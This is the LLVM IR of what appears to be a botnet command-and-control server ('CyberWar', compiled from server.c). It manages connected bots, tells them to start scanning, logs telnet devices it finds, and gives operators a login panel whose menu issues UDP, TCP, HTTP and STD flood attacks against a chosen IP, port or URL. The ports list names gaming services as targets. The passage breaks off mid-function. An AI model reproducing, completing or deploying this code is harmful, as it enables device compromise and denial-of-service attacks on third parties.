; ModuleID = 'host/ir_O1/CyberWar.ll'
source_filename = "server.c"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.clientdata_t = type { i32, i8 }
%struct.telnetdata_t = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.login_info = type { [20 x i8], [20 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i16, [14 x i8] }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = common local_unnamed_addr global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = common local_unnamed_addr global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"\1B[31m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"sent to fd: %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [16 x i8] c"\0D\0A\1B[32mLinux~: \00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.6 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.7 = private unnamed_addr constant [14 x i8] c"!* LOLNOGTFO\0A\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.9 = private unnamed_addr constant [15 x i8] c"!* SCANNER ON\0A\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"REPORT \00", align 1
@telFD = internal unnamed_addr global %struct._IO_FILE* null, align 8
@.str.12 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@TELFound = internal global i32 0, align 4
@.str.13 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@scannerreport = internal global i32 0, align 4
@.str.14 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.15 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.16 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.17 = private unnamed_addr constant [47 x i8] c"%c]0;Bots Connected: %d | User(s) Online: %d%c\00", align 1
@OperatorsConnected = internal global i32 0, align 4
@.str.18 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.20 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@accounts = internal global [22 x %struct.login_info] zeroinitializer, align 16
@.str.21 = private unnamed_addr constant [22 x i8] c"\1B[37mLogin ID: \1B[30m \00", align 1
@.str.23 = private unnamed_addr constant [22 x i8] c"\1B[37mPasscode: \1B[30m \00", align 1
@.str.24 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.25 = private unnamed_addr constant [48 x i8] c"\1B[31mIP Logged, Disconnecting From Session...\0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [92 x i8] c"\1B[32m  ######  ##    ## ########  ######## ########  \1B[31m##      ##    ###    ########  \0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [92 x i8] c"\1B[32m ##    ##  ##  ##  ##     ## ##       ##     ## \1B[31m##  ##  ##   ## ##   ##     ## \0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [92 x i8] c"\1B[32m ##         ####   ##     ## ##       ##     ## \1B[31m##  ##  ##  ##   ##  ##     ## \0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [92 x i8] c"\1B[32m ##          ##    ########  ######   ########  \1B[31m##  ##  ## ##     ## ########  \0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [92 x i8] c"\1B[32m ##          ##    ##     ## ##       ##   ##   \1B[31m##  ##  ## ######### ##   ##   \0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [92 x i8] c"\1B[32m ##    ##    ##    ##     ## ##       ##    ##  \1B[31m##  ##  ## ##     ## ##    ##  \0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [158 x i8] c"\1B[32m  ######     ##    ########  ######## ##     ##  \1B[31m###  ###  ##     ## ##     ##                                                                   \0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [82 x i8] c"\1B[31m     _____________________________________________________________________\0D\0A\00", align 1
@.str.34 = private unnamed_addr constant [9 x i8] c"\1B[30m \0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [74 x i8] c"                              \1B[37m \1B[37m[ \1B[32mYour ID: \1B[31m%s\1B[37m ]\0D\0A\00", align 1
@.str.36 = private unnamed_addr constant [84 x i8] c"                          \1B[37m \1B[37m[ \1B[32mOpen Main Menu With: \1B[31mMenu\1B[37m ]\0D\0A\00", align 1
@.str.37 = private unnamed_addr constant [13 x i8] c"\1B[37mLinux~:\00", align 1
@.str.38 = private unnamed_addr constant [5 x i8] c"Bots\00", align 1
@.str.39 = private unnamed_addr constant [68 x i8] c"Bots Connected: [\1B[32m %d \1B[37m] | Users Online: [\1B[32m %d \1B[37m]\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [5 x i8] c"Stat\00", align 1
@.str.41 = private unnamed_addr constant [62 x i8] c"Telnet Devices: [\1B[32m %d \1B[37m] | Status: [\1B[32m %d \1B[37m]\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [5 x i8] c"Menu\00", align 1
@.str.43 = private unnamed_addr constant [54 x i8] c"\0D\0A\1B[37m[ \1B[32mYou Have Opened The Menu, %s \1B[37m]\0D\0A\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [68 x i8] c"\1B[32m#   \1B[32m UDP Attack: \1B[32m!* UDP [IP] [Port] [Time] 32 0 10\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [72 x i8] c"\1B[32m#   \1B[32m TCP Attack: \1B[32m!* TCP [IP] [Port] [Time] 32 all 0 10\0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [56 x i8] c"\1B[32m#   \1B[32m HTTP Attack: \1B[32m!* HTTP [Url] [Time]\0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [60 x i8] c"\1B[32m#   \1B[32m STD Attack: \1B[32m!* STD [IP] [Port] [Time]\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [12 x i8] c"   \1B[30m \0D\0A\00", align 1
@.str.49 = private unnamed_addr constant [76 x i8] c"   \1B[32m  ---------------------------------------------------------------\0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Main Menu:     \1B[31m[ \1B[32mMenu  \1B[31m]\0D\0A\00", align 1
@.str.51 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Bot Count:     \1B[31m[ \1B[32mBots  \1B[31m]\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Telnet Status: \1B[31m[ \1B[32mStat  \1B[31m]\0D\0A\00", align 1
@.str.53 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Logout:        \1B[31m[ \1B[32mLog   \1B[31m]\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Kill Attack:   \1B[31m[ \1B[32mKill  \1B[31m]\0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Clear Screen:  \1B[31m[ \1B[32mClear \1B[31m]\0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [57 x i8] c"\1B[32m#   \1B[32m Credits:       \1B[31m[ \1B[32mCreds \1B[31m]\0D\0A\00", align 1
@.str.57 = private unnamed_addr constant [7 x i8] c"Hidden\00", align 1
@.str.58 = private unnamed_addr constant [50 x i8] c"   \0D\0A\1B[32m[\1B[32m You Must Be A 1337 ;) \1B[32m]\0D\0A\0D\0A\00", align 1
@.str.59 = private unnamed_addr constant [56 x i8] c"   \1B[32m UDP - \1B[32m!* UDP [IP] [Port] [Time] 32 0 10\0D\0A\00", align 1
@.str.60 = private unnamed_addr constant [60 x i8] c"   \1B[32m TCP - \1B[32m!* TCP [IP] [Port] [Time] 32 all 0 10\0D\0A\00", align 1
@.str.61 = private unnamed_addr constant [44 x i8] c"   \1B[32m HTTP - \1B[32m!* HTTP [Url] [Time]\0D\0A\00", align 1
@.str.62 = private unnamed_addr constant [48 x i8] c"   \1B[32m STD - \1B[32m!* STD [IP] [PORT] [TIME]\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [5 x i8] c"Kill\00", align 1
@.str.64 = private unnamed_addr constant [19 x i8] c"\1B[32m!* KILLATTK\0D\0A\00", align 1
@.str.65 = private unnamed_addr constant [6 x i8] c"Clear\00", align 1
@.str.66 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"Creds\00", align 1
@.str.68 = private unnamed_addr constant [57 x i8] c"\0D\0A\1B[34mCredits-> \1B[32mMade By Vendettxs On Instagram\0D\0A\0D\0A\00", align 1
@.str.69 = private unnamed_addr constant [6 x i8] c"Ports\00", align 1
@.str.70 = private unnamed_addr constant [98 x i8] c"\0D\0A\1B[37mPORTS: \1B[31mXBOX Services: 3074 | PSN Services: 443 | DEFAULT: 80 | DNS/Nameserver: 53\0D\0A\0D\0A\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"Log\00", align 1
@.str.72 = private unnamed_addr constant [40 x i8] c"Terminating Session. Logging Out ID: %s\00", align 1
@.str.73 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.74 = private unnamed_addr constant [11 x i8] c"server.log\00", align 1
@.str.75 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.76 = private unnamed_addr constant [9 x i8] c"%I:%M %p\00", align 1
@.str.77 = private unnamed_addr constant [13 x i8] c"[%s] %s: %s\0A\00", align 1
@.str.78 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.79 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.80 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external local_unnamed_addr global %struct._IO_FILE*, align 8
@.str.81 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.82 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.83 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.84 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.85 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.86 = private unnamed_addr constant [4 x i8] c"FBI\00", align 1
@.str.87 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.88 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.89 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.90 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind uwtable
define i32 @fdgets(i8* nocapture, i32, i32) local_unnamed_addr #0 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #10
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %14, %13
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.0.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.0.lcssa = phi i32 [ 1, %3 ], [ %.0.lcssa.ph, %.critedge.loopexit ]
  ret i32 %.0.lcssa
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #0 {
  %2 = tail call i64 @strlen(i8* %0) #9
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #9
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %25
  %.0.lcssa.ph = phi i32 [ %24, %.lr.ph22 ], [ %26, %25 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %sext33 = shl i64 %indvars.iv29, 32
  %17 = ashr exact i64 %sext33, 32
  %18 = sext i32 %.0.lcssa to i64
  br label %.critedge

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %25
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %25 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %26, %25 ]
  %19 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %20 = load i8, i8* %19, align 1
  %21 = sext i8 %20 to i32
  %22 = tail call i32 @isspace(i32 %21) #9
  %23 = icmp eq i32 %22, 0
  %24 = trunc i64 %indvars.iv27 to i32
  br i1 %23, label %.critedge.preheader.loopexit, label %25

; <label>:25:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %26 = add nsw i32 %.021, -1
  %27 = icmp sgt i64 %indvars.iv27, %14
  br i1 %27, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader26, %.critedge
  %indvars.iv = phi i64 [ %16, %.critedge.preheader26 ], [ %indvars.iv.next, %.critedge ]
  %28 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %29 = load i8, i8* %28, align 1
  %30 = sub nsw i64 %indvars.iv, %17
  %31 = getelementptr inbounds i8, i8* %0, i64 %30
  store i8 %29, i8* %31, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %32 = icmp slt i64 %indvars.iv, %18
  br i1 %32, label %.critedge, label %.critedge._crit_edge.loopexit

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %33 = sub i64 %.019.lcssa, %indvars.iv29
  %sext34 = shl i64 %33, 32
  %34 = ashr exact i64 %sext34, 32
  %35 = getelementptr inbounds i8, i8* %0, i64 %34
  store i8 0, i8* %35, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @broadcast(i8*, i32, i8*) local_unnamed_addr #0 {
  %4 = alloca i64, align 8
  %5 = tail call i32 @strcmp(i8* %0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #9
  %6 = icmp eq i32 %5, 0
  %7 = tail call i64 @strlen(i8* %0) #9
  %8 = add i64 %7, 10
  %9 = tail call noalias i8* @malloc(i64 %8) #10
  %10 = tail call i64 @strlen(i8* %0) #9
  %11 = add i64 %10, 10
  tail call void @llvm.memset.p0i8.i64(i8* %9, i8 0, i64 %11, i32 1, i1 false)
  %12 = tail call i8* @strcpy(i8* %9, i8* %0) #10
  tail call void @trim(i8* %9)
  %13 = call i64 @time(i64* nonnull %4) #10
  %14 = call %struct.tm* @localtime(i64* nonnull %4) #10
  %15 = call i8* @asctime(%struct.tm* %14) #10
  call void @trim(i8* %15)
  %16 = zext i32 %1 to i64
  br label %17

; <label>:17:                                     ; preds = %59, %3
  %indvars.iv = phi i64 [ 0, %3 ], [ %indvars.iv.next, %59 ]
  %18 = icmp eq i64 %indvars.iv, %16
  br i1 %18, label %59, label %19

; <label>:19:                                     ; preds = %17
  %20 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv, i32 1
  %21 = load i8, i8* %20, align 4
  %22 = icmp eq i8 %21, 0
  br i1 %22, label %23, label %28

; <label>:23:                                     ; preds = %19
  br i1 %6, label %59, label %24

; <label>:24:                                     ; preds = %23
  %25 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %indvars.iv, i32 0
  %26 = load i32, i32* %25, align 4
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %59, label %.thread

; <label>:28:                                     ; preds = %19
  br i1 %6, label %.critedge, label %.thread

.thread:                                          ; preds = %24, %28
  %29 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %indvars.iv, i32 0
  %30 = load i32, i32* %29, align 4
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %40, label %32

; <label>:32:                                     ; preds = %.thread
  %33 = trunc i64 %indvars.iv to i32
  %34 = call i64 @send(i32 %33, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0), i64 5, i32 16384) #10
  %35 = call i64 @strlen(i8* %2) #9
  %36 = trunc i64 %indvars.iv to i32
  %37 = call i64 @send(i32 %36, i8* %2, i64 %35, i32 16384) #10
  %38 = trunc i64 %indvars.iv to i32
  %39 = call i64 @send(i32 %38, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i64 2, i32 16384) #10
  br label %40

; <label>:40:                                     ; preds = %32, %.thread
  %41 = trunc i64 %indvars.iv to i32
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0), i32 %41)
  %43 = call i64 @strlen(i8* %0) #9
  %44 = trunc i64 %indvars.iv to i32
  %45 = call i64 @send(i32 %44, i8* %0, i64 %43, i32 16384) #10
  %46 = load i32, i32* %29, align 4
  %47 = icmp eq i32 %46, 0
  br i1 %47, label %56, label %48

; <label>:48:                                     ; preds = %40
  %49 = trunc i64 %indvars.iv to i32
  %50 = call i64 @send(i32 %49, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4, i64 0, i64 0), i64 13, i32 16384) #10
  br label %59

.critedge:                                        ; preds = %28
  %51 = trunc i64 %indvars.iv to i32
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0), i32 %51)
  %53 = call i64 @strlen(i8* %0) #9
  %54 = trunc i64 %indvars.iv to i32
  %55 = call i64 @send(i32 %54, i8* %0, i64 %53, i32 16384) #10
  br label %56

; <label>:56:                                     ; preds = %.critedge, %40
  %57 = trunc i64 %indvars.iv to i32
  %58 = call i64 @send(i32 %57, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0), i64 1, i32 16384) #10
  br label %59

; <label>:59:                                     ; preds = %24, %48, %56, %17, %23
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 1000000
  br i1 %exitcond, label %60, label %17

; <label>:60:                                     ; preds = %59
  call void @free(i8* %9) #10
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #3

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) local_unnamed_addr #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) local_unnamed_addr #3

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @printf(i8* nocapture readonly, ...) local_unnamed_addr #3

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #3

; Function Attrs: noinline noreturn nounwind uwtable
define noalias nonnull i8* @BotEventLoop(i8* nocapture readnone) #5 {
  %2 = alloca %struct.epoll_event, align 4
  %3 = alloca %struct.sockaddr_in, align 2
  %tmpcast = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = tail call noalias i8* @calloc(i64 1000000, i64 12) #10
  %7 = bitcast i8* %6 to %struct.epoll_event*
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2, i32 0
  %10 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %2, i64 0, i32 1
  %11 = bitcast %union.epoll_data* %10 to i32*
  %12 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %2, i64 0, i32 0
  %13 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  br label %.loopexit61.outer

.loopexit61.outer.loopexit:                       ; preds = %.loopexit
  br label %.loopexit61.outer

.loopexit61.outer:                                ; preds = %.loopexit61.outer.loopexit, %1
  br label %.loopexit61

.loopexit61:                                      ; preds = %.loopexit61.outer, %.loopexit61
  %14 = load volatile i32, i32* @epollFD, align 4
  %15 = call i32 @epoll_wait(i32 %14, %struct.epoll_event* %7, i32 1000000, i32 -1) #10
  %16 = icmp sgt i32 %15, 0
  br i1 %16, label %.lr.ph78.preheader, label %.loopexit61

.lr.ph78.preheader:                               ; preds = %.loopexit61
  %17 = sext i32 %15 to i64
  br label %.lr.ph78

.lr.ph78:                                         ; preds = %.lr.ph78.preheader, %.loopexit
  %indvars.iv84 = phi i64 [ 0, %.lr.ph78.preheader ], [ %indvars.iv.next85, %.loopexit ]
  %18 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %7, i64 %indvars.iv84, i32 0
  %19 = load i32, i32* %18, align 1
  %20 = and i32 %19, 25
  %21 = icmp eq i32 %20, 1
  br i1 %21, label %29, label %22

; <label>:22:                                     ; preds = %.lr.ph78
  %23 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %7, i64 %indvars.iv84, i32 1
  %24 = bitcast %union.epoll_data* %23 to i32*
  %25 = load i32, i32* %24, align 1
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %26, i32 1
  store i8 0, i8* %27, align 4
  %28 = call i32 @close(i32 %25) #10
  br label %.loopexit

; <label>:29:                                     ; preds = %.lr.ph78
  %30 = load volatile i32, i32* @listenFD, align 4
  %31 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %7, i64 %indvars.iv84, i32 1
  %32 = bitcast %union.epoll_data* %31 to i32*
  %33 = load i32, i32* %32, align 1
  %34 = icmp eq i32 %30, %33
  br i1 %34, label %.preheader, label %81

.preheader:                                       ; preds = %29
  store i32 16, i32* %4, align 4
  %35 = load volatile i32, i32* @listenFD, align 4
  %36 = call i32 @accept(i32 %35, %struct.sockaddr* nonnull %tmpcast, i32* nonnull %4) #10
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %._crit_edge, label %.lr.ph73.preheader

.lr.ph73.preheader:                               ; preds = %.preheader
  br label %.lr.ph73

._crit_edge.loopexit:                             ; preds = %.backedge59
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %38 = tail call i32* @__errno_location() #11
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 11
  br i1 %40, label %.loopexit, label %41

; <label>:41:                                     ; preds = %._crit_edge
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0)) #12
  br label %.loopexit

.lr.ph73:                                         ; preds = %.lr.ph73.preheader, %.backedge59
  %42 = phi i32 [ %79, %.backedge59 ], [ %36, %.lr.ph73.preheader ]
  %43 = load i32, i32* %9, align 2
  %44 = sext i32 %42 to i64
  %45 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44, i32 0
  store i32 %43, i32* %45, align 8
  %46 = zext i32 %42 to i64
  br label %47

; <label>:47:                                     ; preds = %128, %.lr.ph73
  %indvars.iv = phi i64 [ 0, %.lr.ph73 ], [ %indvars.iv.next.1, %128 ]
  %48 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv, i32 1
  %49 = load i8, i8* %48, align 4
  %50 = icmp eq i8 %49, 0
  %51 = icmp eq i64 %indvars.iv, %46
  %or.cond57 = or i1 %51, %50
  br i1 %or.cond57, label %57, label %52

; <label>:52:                                     ; preds = %47
  %53 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv, i32 0
  %54 = load i32, i32* %53, align 16
  %55 = load i32, i32* %45, align 8
  %56 = icmp eq i32 %54, %55
  br i1 %56, label %62, label %57

; <label>:57:                                     ; preds = %47, %52
  %indvars.iv.next = or i64 %indvars.iv, 1
  %58 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv.next, i32 1
  %59 = load i8, i8* %58, align 4
  %60 = icmp eq i8 %59, 0
  %61 = icmp eq i64 %indvars.iv.next, %46
  %or.cond57.1 = or i1 %61, %60
  br i1 %or.cond57.1, label %128, label %123

; <label>:62:                                     ; preds = %123, %52
  %63 = call i64 @send(i32 %42, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i64 0, i64 0), i64 13, i32 16384) #10
  %64 = call i32 @close(i32 %42) #10
  br label %.backedge59

.critedge58:                                      ; preds = %128
  %65 = call fastcc i32 @make_socket_non_blocking(i32 %42)
  %66 = icmp eq i32 %65, -1
  br i1 %66, label %67, label %69

; <label>:67:                                     ; preds = %.critedge58
  %68 = call i32 @close(i32 %42) #10
  br label %.loopexit

; <label>:69:                                     ; preds = %.critedge58
  store i32 %42, i32* %11, align 4
  store i32 -2147483647, i32* %12, align 4
  %70 = load volatile i32, i32* @epollFD, align 4
  %71 = call i32 @epoll_ctl(i32 %70, i32 1, i32 %42, %struct.epoll_event* nonnull %2) #10
  %72 = icmp eq i32 %71, -1
  br i1 %72, label %73, label %75

; <label>:73:                                     ; preds = %69
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0)) #12
  %74 = call i32 @close(i32 %42) #10
  br label %.loopexit

; <label>:75:                                     ; preds = %69
  %76 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44, i32 1
  store i8 1, i8* %76, align 4
  %77 = call i64 @send(i32 %42, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.9, i64 0, i64 0), i64 14, i32 16384) #10
  br label %.backedge59

.backedge59:                                      ; preds = %75, %62
  store i32 16, i32* %4, align 4
